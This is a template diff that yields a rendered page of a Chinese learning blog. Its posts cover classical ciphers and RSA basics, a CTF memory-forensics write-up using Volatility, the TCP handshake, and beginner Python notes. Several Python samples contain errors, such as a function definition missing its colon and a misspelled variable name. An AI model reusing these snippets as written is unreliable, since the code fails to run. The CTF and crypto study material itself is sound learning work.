@@ -1,23 +1,2425 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
-{% block title %}{{ config.title }}{% if theme.index_with_subtitle and config.subtitle %} - {{config.subtitle }}{% endif %}{% endblock %}
 
-{% block page_class %}
-  {% if is_home() %}page-home{% endif -%}
-{% endblock %}
 
-{% block content %}
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这是一个学习博客">
+<meta property="og:type" content="website">
+<meta property="og:title" content="yzklov">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="yzklov">
+<meta property="og:description" content="这是一个学习博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="yzklov">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/page/2/"/>
+
+
+
+
+
+  <title>yzklov</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yzklov</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">做自己就好了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
   <section id="posts" class="posts-expand">
-    {% for post in page.posts %}
-      {{ post_template.render(post, true) }}
-    {% endfor %}
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/Crypto.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/Crypto.html" itemprop="url">Crypto</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-12T22:26:35+08:00">
+                2023-05-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ul>
+<li>ROT13编码<br>ROT13(有时中间加了个连字符称作ROT-13) 是一种简易的替换式密码,凯撒加密的一种变体</li>
+<li>摩斯密码<br>摩斯电码定义了包括：英文字母A-Z（大写）十进制数字0-9，以及简单的标点符号？ &#x2F; ）－ ． </li>
+<li>quoted-printable编码用于将非 ASCII 字符转换为 ASCII 字符，以便在电子邮件等文本传输中使用。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</span><br></pre></td></tr></table></figure></li>
+<li>Rabbit 开头部分通常为U2FsdGVkX1<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/+ydnDPowGbjjJXhZxm2MP2AgI</span><br></pre></td></tr></table></figure></li>
+<li>栅栏密码:所谓栅栏密码，就是把明文分成N个组，然后取出每组的第一个，每组的第二个。。接着按顺序排列得出密文<br>题目：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一只小羊跳过了栅栏，两只小样跳过了栅栏，一坨小羊跳过了栅栏…</span><br><span class="line">tn c0afsiwal kes,hwit1r g,npt ttessfu&#125;ua u hmqik e &#123;m, n huiouosarwCniibecesnren</span><br></pre></td></tr></table></figure>
+思路：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于题中提到了栅栏，于是猜这段字符串使用了栅栏密码，去掉空格后一数发现字符串长度为71，因为71是一个素数，所以无法对其进行各很好的分组，所以猜测空格可能是计数的，再看字符串中有些字母中间空格不止一个，就更加肯定空格是计数的了，于是加上空格，字符串长度为85，而85的因子有5和17，于是乎我们就可以按5个一组或17个一组去试</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="buuctf-变异凯撒"><a href="#buuctf-变异凯撒" class="headerlink" title="buuctf 变异凯撒"></a>buuctf 变异凯撒</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str1 = &quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span><br><span class="line">str2 = list(str1)</span><br><span class="line">str3 = &#x27;&#x27;</span><br><span class="line">num = len(str2)</span><br><span class="line">for i in range(0, num):</span><br><span class="line">    str3 = str3 + chr(ord(str2[i]) + 5 + i)</span><br><span class="line">print(str3)</span><br></pre></td></tr></table></figure>
+<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><ul>
+<li>RSA是一种公钥密码算法，在RSA中，明文、密钥和密文都是数字</li>
+<li>RSA加密：RSA的密文是对代表了明文的数字的E次方求mod N的结果<br><img src="/./img/136.png"><br>E和N是RSA加密的密钥，也就是说，E和N的组合就是公钥</li>
+<li>RSA解密：在RSA中，加密和解密的形式是相同的。加密是求E次方的modN，而解密则是求D次方的modN</li>
+</ul>
+<h2 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h2><h3 id="同余"><a href="#同余" class="headerlink" title="同余"></a>同余</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#同余：若(a mod n)=(b mod n),则称两整数a和b模n同余，记作a≡b(mod n)</span><br><span class="line">#乘法逆元：如果gcd(a,n)=1,则a在模n下存在唯一整数x(x&lt;n),使得ax≡1 mod n，称x是a在模n下的乘法逆元(gcd是GCD函数，即返回两个或多个整数的最大公约数)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>同余的一些性质<br><img src="/./img/137.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E9%B2%B2%E9%B9%8F%E6%9D%AF.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E9%B2%B2%E9%B9%8F%E6%9D%AF.html" itemprop="url">鲲鹏杯</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-28T17:59:24+08:00">
+                2023-04-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h1><h2 id="signin-for-forensics"><a href="#signin-for-forensics" class="headerlink" title="signin_for_forensics"></a>signin_for_forensics</h2><p>解法一：</p>
+<ul>
+<li>vol.py -f signin.vmem imageinfo<br><img src="/img/106.png"><br>要验证哪一个系统正确，可以使用命令：</li>
+<li>vol.py -f signin.vmem –profile&#x3D;Win7SP1x64 volshell<br>下图这样说明成功<br><img src="/img/107.png"><br>接下来寻找flag所在的文件<br>可以使用fl来匹配也可以.txt</li>
+<li>vol.py -f signin.vmem –profile&#x3D;Win7SP1x64 filescan | grep fl<br><img src="/img/108.png"><br>dump fllllag.txt文件</li>
+<li>vol.py -f signin.vmem –profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000007e6eac00 -D .&#x2F;<br>得到一个.dat数据文件<br>用010editor打开<br><img src="/img/109.png"></li>
+</ul>
+<p>解法二：</p>
+<ul>
+<li>vol.py -f signin.vmem imageinfo</li>
+<li>vol.py -f signin.vmem –profile&#x3D;Win7SP1x64 clipboard<br><img src="/img/110.png"></li>
+</ul>
+<h2 id="ezvmem-1"><a href="#ezvmem-1" class="headerlink" title="ezvmem-1"></a>ezvmem-1</h2><ul>
+<li>vol.py -f challenge.vmem  –profile&#x3D;Win7SP1x64  psxview<br>使用各种进程列表查找隐藏进程<br><img src="/img/112.png"><br>因为描述说明了恶意进程是隐藏起来的，因此定位 pslist 为 false 的文件，整个列表就这么一个文件，因此提交该文件的 offset 即可</li>
+</ul>
+<h2 id="ezvmem-2"><a href="#ezvmem-2" class="headerlink" title="ezvmem-2"></a>ezvmem-2</h2><ul>
+<li>vol.py -f challenge.vmem –profile&#x3D;Win7SP1x64 procdump –offset&#x3D;0x000000007d336950 -D .&#x2F;<br>procdump：将进程转储到可执行文件示例中<br>然后把这个文件放到沙箱中跑一下就可以知道木马类型了<br><img src="/img/111.png"></li>
+</ul>
+<h2 id="ezvmem-3"><a href="#ezvmem-3" class="headerlink" title="ezvmem-3"></a>ezvmem-3</h2>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.html" itemprop="url">TCP三次握手</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-27T20:04:50+08:00">
+                2023-04-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在客户端和服务器使用connect()建立连接时会互相发送三个数据包<br>请看下图：<br><img src="/img/105.png"></p>
+<ul>
+<li>三次握手的原因：<br>进行三次握手的主要作用就是为了确认双方的接收能力和发送能力是否正常、指定自己的初始化序列号为后面的可靠性传送做准备。</li>
+<li>过程<br>第一次握手：标志位SYN &#x3D; 1，随机生成一个序列号seq1 &#x3D; x<br>第二次握手：标志位SYN ,ACK &#x3D; 1，确认号ack &#x3D; x + 1，随机生成一个序列号seq2&#x3D;y<br>第三次握手：标志位ACK &#x3D; 1, 确认号ack &#x3D; y + 1，seq2&#x3D; x + 1</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/python.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/python.html" itemprop="url">python</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-25T23:47:38+08:00">
+                2023-04-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>写在前面：python程序运行过程中要读取文件内容是读取所在工作目录文件夹下的文件，所以必须先打开该文件夹才能读取，否则会有类似这样的报错：<br><code>FileNotFoundError: [Errno 2] No such file or directory: &#39;base64.txt&#39;</code><br>在vscode上添加python运行环境理论上只要先下载某个版本的python再安装个python插件就行了</p>
+<ul>
+<li>pycharm运行python程序的时候是在相应的文件目录下运行的，而vscode是在相应的工程目录下运行的</li>
+<li>type() 显示类型信息</li>
+<li>python中变量没有类型，它储存的数据有类型</li>
+</ul>
+<h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int(x) 将x转换为一个整数 </span><br><span class="line">float() str()同理</span><br></pre></td></tr></table></figure>
+<p>ps：别的数据类型转字符串只要加上单引号或双引号，所以基本都能实现，但比如字符串转数字就要求字符串内容都是数字</p>
+<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul>
+<li>可以使用单、双、三引号</li>
+<li>引号的嵌套可以使用\转义，也可以在单引号内写双引号或在双引号内写单引号</li>
+</ul>
+<h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><p>1、字符串和字符串直接使用+<br>2、字符串和变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字符串格式化1</span><br><span class="line">语法：&#x27;%占位符&#x27;%变量</span><br><span class="line">字符串：%s 整数：%d 浮点数：%f</span><br><span class="line">字符串格式化2</span><br><span class="line">语法： f&quot;内容&#123;变量或表达式&#125;&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>数字精度控制<br>使用辅助符号”m.n”来控制数据的宽度和精度</li>
+<li>m：控制宽度，宽度小于数字本身不生效，小数点和小数部分也算入宽度计算</li>
+<li>n：控制小数点精度，会进行小数的四舍五入</li>
+</ul>
+<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p>input():获取键盘输入的数据<br>ps：获取的数据都是字符串类型</p>
+<h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if 要判断的条件：</span><br><span class="line">	条件成立时，要做的事情</span><br><span class="line">elif 条件：</span><br><span class="line">	...</span><br><span class="line">elif 条件：</span><br><span class="line">	...</span><br><span class="line">else:</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
+<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 临时变量 in 待处理数据集：</span><br><span class="line">	循环满足条件时执行的代码</span><br><span class="line">	for 临时变量 in 待处理数据集：</span><br><span class="line">		循环满足条件时执行的代码</span><br></pre></td></tr></table></figure>
+<ul>
+<li>循环内的语句需要有空格缩进</li>
+<li>严格来说，待处理数据集是序列类型</li>
+<li>序列类型：字符串、列表、元组<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># for循环输出九九乘法表</span><br><span class="line">for i in range(1, 10):</span><br><span class="line">    for j in range(1, i + 1):</span><br><span class="line">        print(f&quot;&#123;j&#125;*&#123;i&#125;=&#123;j*i&#125;\t&quot;, end=&#x27;&#x27;)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="range语句"><a href="#range语句" class="headerlink" title="range语句"></a>range语句</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">语法一：range(num)</span><br><span class="line">获取一个从0开始，到num结束的数字序列(不含num本身)</span><br><span class="line">语法二：range(num1,num2)</span><br><span class="line">从num1到num2(不含num2本身)</span><br><span class="line">语法三：range(num1,num2,step)</span><br><span class="line">在语法二的基础上添加了数字之间的步长，以step为准，默认为1</span><br></pre></td></tr></table></figure>
+<h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">while 条件：</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">	while 条件：</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>
+<ul>
+<li>条件需提供布尔类型的结果，true继续，false停止</li>
+<li>while循环可以嵌套<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 输出九九乘法表</span><br><span class="line">i=1</span><br><span class="line">while i&lt;=9:</span><br><span class="line">	j=1</span><br><span class="line">	while j&lt;=i:</span><br><span class="line">		print(f&quot;&#123;j&#125;*&#123;i&#125;=&#123;j*i&#125;\t&quot;,end=&#x27;&#x27;)</span><br><span class="line">		j+=1</span><br><span class="line">	i+=1</span><br><span class="line">	print() # 换行</span><br></pre></td></tr></table></figure></li>
+<li>continue:中断本次循环，直接进入下一次循环</li>
+<li>break：直接结束循环<br>ps：内层循环的continue和break不影响外层</li>
+</ul>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def 函数名(传入参数)：</span><br><span class="line">	函数体</span><br><span class="line">	return 返回值</span><br></pre></td></tr></table></figure>
+<ul>
+<li>特殊字面量：None<br>不使用return语句即返回None</li>
+<li>使用场景：函数返回值、if判断、变量定义(不想给他赋值)</li>
+</ul>
+<h3 id="给python改了个阿里源，pip下载的速度快多了"><a href="#给python改了个阿里源，pip下载的速度快多了" class="headerlink" title="给python改了个阿里源，pip下载的速度快多了"></a>给python改了个阿里源，pip下载的速度快多了</h3><h3 id="变量在函数中的作用域"><a href="#变量在函数中的作用域" class="headerlink" title="变量在函数中的作用域"></a>变量在函数中的作用域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num=100</span><br><span class="line">def testb()</span><br><span class="line">	num=500</span><br><span class="line">	print(num)</span><br><span class="line">testb()</span><br><span class="line">print(f&#x27;全局变量num=&#123;num&#125;&#x27;)</span><br><span class="line"># 500</span><br><span class="line">  全局变量num=100</span><br></pre></td></tr></table></figure>
+<p>testb中的num仍然是局部变量<br>加上global关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num=100</span><br><span class="line">def testb()</span><br><span class="line">	global num # 声明num是全局变量</span><br><span class="line">	num=500</span><br><span class="line">	print(num)</span><br><span class="line">testb()</span><br><span class="line">print(f&#x27;全局变量num=&#123;num&#125;&#x27;)</span><br><span class="line"># 500</span><br><span class="line">  全局变量num=500</span><br></pre></td></tr></table></figure>
+<h2 id="python数据容器"><a href="#python数据容器" class="headerlink" title="python数据容器"></a>python数据容器</h2><p>1、什么是数据容器<br>一种可以存储多个元素的python数据类型<br>2、python有那些哪些数据类型<br>list列表、tuple元组、str字符串、set集合、dict字典</p>
+<h2 id="list-列表"><a href="#list-列表" class="headerlink" title="list(列表)"></a>list(列表)</h2><h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 定义变量</span><br><span class="line">变量名称 = [元素1,...] # 逗号隔开</span><br><span class="line"># 定义空列表</span><br><span class="line">变量名称 = []</span><br><span class="line">变量名称 = list()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>元素可以是不同类型的数据，支持嵌套<br><img src="/./img/192.png"></li>
+</ul>
+<h2 id="Python-encode方法"><a href="#Python-encode方法" class="headerlink" title="Python encode方法"></a>Python encode方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gm：str.encode([encoding=&#x27;utf-8&#x27;],[errors=&#x27;strict&#x27;])</span><br><span class="line">encoding – 可选参数，要使用的编码，默认编码为 ‘utf-8’</span><br><span class="line">errors – 可选参数，设置不同错误的处理方案。默认为 ‘strict’,意为编码错误引起一个UnicodeError。 其他可能得值有 ‘ignore’, ‘replace’, ‘xmlcharrefreplace’, ‘backslashreplace’ 以及通过 codecs.register_error() 注册的任何值</span><br><span class="line">在使用encode()方法时，报错原因一般都是errors参数问题，改为‘ignore’就好了</span><br></pre></td></tr></table></figure>
+<p>bytes通过decode（）转换为str（字符串）<br>str通过encode（）转换为bytes（二进制）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;菜鸟教程&#x27;</span><br><span class="line">s_utf8 = s.encode(&quot;UTF-8&quot;)</span><br><span class="line">s_gbk = s.encode(&quot;GBK&quot;)</span><br><span class="line">print(s)</span><br><span class="line">print(&quot;UTF-8编码：&quot;,s_utf-8)</span><br><span class="line">print(&quot;GBK编码：&quot;,s_gbk)</span><br><span class="line">print(&quot;UTF-8解码：&quot;,s_utf-8.decode(&quot;UTF-8&quot;,&quot;strict&quot;))</span><br><span class="line">print(&quot;GBK解码：&quot;,s_gbk.decode(&quot;GBK&quot;,&quot;strict&quot;))</span><br></pre></td></tr></table></figure>
